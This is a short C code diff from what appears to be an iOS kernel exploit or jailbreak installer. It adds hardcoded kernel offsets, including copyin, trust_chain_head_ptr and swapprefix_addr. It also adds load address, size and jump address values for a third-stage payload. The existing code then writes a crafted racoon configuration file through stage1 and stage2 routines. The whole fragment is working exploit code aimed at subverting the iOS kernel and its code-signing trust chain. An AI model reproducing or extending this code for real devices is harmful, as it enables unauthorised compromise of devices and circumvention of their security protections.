@@ -40,10 +40,18 @@ int install(const char *config_path, const char *racoon_path, const char *dyld_c
 	myoffsets.rootdomainUC_vtab = 0xfffffff00708d870;
 	myoffsets.itk_registered = 0x2f0;
 	myoffsets.is_task = 0x28;
+	myoffsets.copyin = 0xfffffff0071a05bc;
+	myoffsets.swapprefix_addr = 0xfffffff0075898bc;
+	myoffsets.trust_chain_head_ptr = 0xfffffff007687428;
+	myoffsets.stage3_fileoffset = 0;
+	myoffsets.stage3_loadaddr = myoffsets.new_cache_addr-0x100000;
+	myoffsets.stage3_size = 0xd000;
+	myoffsets.stage3_jumpaddr = myoffsets.stage3_loadaddr + 0x7b08;
 
 	// generate stage 2 before stage 1 cause stage 1 needs to know the size of it
 	stage2(&myoffsets,"/private/etc/racoon/");
 
+	// TODO: make sure that the directory exists
 	int f = open("/var/run/racoon/test.conf",O_WRONLY | O_CREAT,0644);
 	stage1(f,&myoffsets);
 	close(f);
